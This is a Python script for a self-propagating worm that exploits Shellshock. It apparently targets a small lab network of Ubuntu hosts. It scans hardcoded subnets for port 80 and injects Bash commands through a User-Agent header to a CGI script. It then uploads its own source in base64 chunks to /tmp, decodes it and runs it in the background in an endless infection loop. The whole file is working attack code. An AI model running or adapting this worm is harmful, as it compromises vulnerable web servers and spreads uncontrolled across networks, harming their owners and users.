#!/usr/bin/env python3
import subprocess
import time
import random
import sys
import os
import urllib.request
import urllib.error
import base64

# Configuration
SUBNETS = [
    "172.28.1",  # net_1_2 (ubuntu1-ubuntu2)
    "172.28.2",  # net_1_3 (ubuntu1-ubuntu3)
    "172.28.3",  # net_2_4 (ubuntu2-ubuntu4)
    "172.28.4",  # net_3_5 (ubuntu3-ubuntu5)
]

TARGET_SCRIPT = "/cgi-bin/status.cgi"
REMOTE_WORM_PATH = "/tmp/worm.py"
REMOTE_B64_PATH = "/tmp/worm.b64"
CHUNK_SIZE = 4000

import socket

def scan_target(ip):
    """
    Scans the target IP for port 80 using socket.
    Returns True if port 80 is open, False otherwise.
    """
    print("[*] Scanning {} for port 80...".format(ip))
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, 80))
        sock.close()
        if result == 0:
            return True
        return False
    except Exception as e:
        print("[-] Error scanning {}: {}".format(ip, e))
        return False

def run_exploit(ip, command):
    """
    Executes a command on the target via Shellshock.
    """
    target_url = "http://{}:80{}".format(ip, TARGET_SCRIPT)
    # Shellshock payload
    payload = "() {{ :; }}; /bin/bash -c '{}'".format(command)
    headers = {
        "User-Agent": payload
    }
    try:
        req = urllib.request.Request(target_url, headers=headers)
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        # 500 errors are expected if we don't output headers, but command might have run
        return e.read().decode('utf-8')
    except Exception as e:
        # print("[-] Exploit error on {}: {}".format(ip, e))
        return None

def infect_target(ip):
    """
    Infects the target by uploading and executing this worm.
    """
    if not scan_target(ip):
        return False

    print("[+] Web Server found at {}!".format(ip))
    print("[*] Attempting infection on {} via Shellshock...".format(ip))

    # 1. Read own source code
    try:
        with open(os.path.abspath(__file__), "rb") as f:
            worm_content = f.read()
        b64_content = base64.b64encode(worm_content).decode('utf-8')
    except Exception as e:
        print("[-] Error reading own source: {}".format(e))
        return False

    # 2. Check if already infected (simple check)
    # We try to ls the worm file. If it exists, we skip.
    check = run_exploit(ip, "echo 'Content-type: text/plain'; echo; /bin/ls {}".format(REMOTE_WORM_PATH))
    if check and REMOTE_WORM_PATH in check:
        print("[*] Target {} already infected.".format(ip))
        return True

    # 3. Clean up remote files
    #run_exploit(ip, "rm -f {} {}".format(REMOTE_B64_PATH, REMOTE_WORM_PATH))

    # 4. Upload in chunks
    print("[*] Uploading worm ({} bytes)...".format(len(b64_content)))
    for i in range(0, len(b64_content), CHUNK_SIZE):
        chunk = b64_content[i:i+CHUNK_SIZE]
        # Append chunk to remote b64 file
        cmd = "/bin/echo -n \"{}\" >> {}".format(chunk, REMOTE_B64_PATH)
        run_exploit(ip, cmd)

    # 5. Decode
    print("[*] Decoding payload...")
    run_exploit(ip, "/usr/bin/base64 -d {} > {}".format(REMOTE_B64_PATH, REMOTE_WORM_PATH))

    # 6. Execute
    print("[+] Executing worm on {}...".format(ip))
    # We run it in background using nohup
    # We verify python3 exists first, though we assume it does based on checks
    cmd = "nohup python3 {} > /tmp/worm.log 2>&1 &".format(REMOTE_WORM_PATH)
    run_exploit(ip, cmd)
    
    print("[+] Infection command sent to {}".format(ip))
    return True

def main():
    print("=== Python Shellshock Worm ===")
    
    # Delay to allow system to settle if just started
    time.sleep(2)
    
    while True:
        print("\n[*] Starting infection round...")
        
        for subnet in SUBNETS:
            # Try hosts .2 and .3
            for host in range(2, 4):
                ip = "{}.{}".format(subnet, host)
                # Skip self (simple check, not robust for all network configs but good enough)
                # In a real worm we'd check interfaces.
                infect_target(ip)
        
        print("[*] Round complete. Sleeping 20 seconds...")
        time.sleep(20)

if __name__ == "__main__":
    main()
